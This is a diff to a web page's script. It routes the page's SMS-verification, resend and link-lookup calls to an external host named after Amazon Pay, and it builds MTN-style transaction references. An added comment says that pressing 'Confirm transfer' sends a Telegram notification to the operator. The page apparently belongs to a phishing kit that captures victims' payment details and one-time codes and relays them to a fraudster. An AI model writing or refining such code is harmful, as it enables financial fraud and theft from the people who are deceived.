@@ -197,14 +197,19 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  /* All critical API calls go to Railway (always-on) instead of the
+     Render origin, so Confirm works even if Render is cold-starting. */
+  const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+
   const CONFIG = {
     OTP_PAGE: 'otp.html',
     SHORT_LINK_ENDPOINTS: [
-      (code) => `/api/links/${encodeURIComponent(code)}`,
-      (code) => `/api/links?code=${encodeURIComponent(code)}`
+      (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
+      (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
     ],
-    SMS_SEND: '/api/verification/sms',
-    SMS_STATUS: (ref) => '/api/verification/sms-status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    SMS_SEND: RAILWAY_BASE + '/api/verification/sms',
+    SMS_STATUS: (ref) => RAILWAY_BASE + '/api/verification/sms-status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    RESEND: RAILWAY_BASE + '/api/verification/resend',
     POLL_MS: 1500
   };
 
@@ -398,7 +403,7 @@
     btn.disabled = true;
     lbl.textContent = 'Sending…';
     try {
-      const r = await fetch('/api/verification/resend', {
+      const r = await fetch(CONFIG.RESEND, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ tx: tx.ref, an: tx.an, c: tx.c, am: tx.am, cur: tx.cur })
@@ -491,6 +496,9 @@
       tx.ref = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
     }
 
+    // Send to Railway immediately — this fires the Telegram notification
+    // BEFORE the overlay opens, so the user sees "Confirm transfer" freeze
+    // for at most one round-trip, then the spinner.
     try {
       const r = await fetch(CONFIG.SMS_SEND, {
         method: 'POST',
